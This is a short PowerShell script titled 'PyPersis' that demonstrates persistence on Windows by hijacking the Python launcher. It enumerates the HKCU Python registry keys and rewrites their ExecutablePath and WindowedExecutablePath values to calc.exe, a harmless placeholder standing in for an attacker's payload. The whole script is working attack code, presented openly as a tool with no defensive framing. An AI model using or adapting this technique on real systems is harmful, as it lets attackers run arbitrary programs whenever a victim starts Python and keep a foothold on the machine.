function Write-ColoredText {
    param (
        [string]$text,
        [string]$color
    )
    Write-Host $text -ForegroundColor $color
}
Write-Host
"
*********************************************************************
*                      PyPersis                                     *
*********************************************************************
*                  Persistence Using Py Command                     *
*                                                                   *
*********************************************************************"
#Get Python's install path from registr
$VersionKeys = Get-ChildItem -Path 'HKCU:\Software\Python\PythonCore'
foreach ($VersionKey in $VersionKeys)
{
    $InstallPath = (Get-ItemProperty -Path ("HKCU:\Software\Python\PythonCore\"+ $VersionKey.PSChildName +"\InstallPath"))."(default)"
    Write-ColoredText "[+]Python Install Path: $InstallPath" "GREEN"

    #Change ExecutablePath to calc.exe
    $ExecPath = "HKCU:\Software\Python\PythonCore\"+ $VersionKey.PSChildName +"\InstallPath"
    Set-ItemProperty -Path $ExecPath -Name "ExecutablePath" -Value "calc.exe"
    # The Defualt Value Of ExecutablePath key: C:\Users\AramesH\AppData\Local\Programs\Python\Python311\python.exe
    Write-ColoredText "[+]Changed ExecutablePath Of Python" "GREEN"
    Set-ItemProperty -Path $ExecPath -Name "WindowedExecutablePath" -Value "calc.exe"
}